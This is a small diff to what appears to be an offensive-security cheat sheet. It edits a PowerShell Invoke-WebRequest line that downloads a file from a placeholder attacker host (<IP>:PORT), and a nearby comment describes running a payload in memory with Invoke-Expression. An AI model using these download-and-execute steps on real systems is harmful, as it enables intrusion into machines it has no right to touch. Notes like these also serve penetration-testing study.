@@ -29,7 +29,7 @@ cd staphy:
 
 #From PowerShell 3.0 Invoke-WebRequest but slower,
 #Alias iwr, curl, wget can be used instead of Invoke-WebRequest
-Invoke-WebRequest http://<IP>:PORT/file.Ext -OutFile file.Ext
+Invoke-WebRequest -uri http://<IP>:PORT/file.Ext -OutFile file.Ext
 
 #Execute Payload directly into memory using Invoke-Expression
 #Alias iex
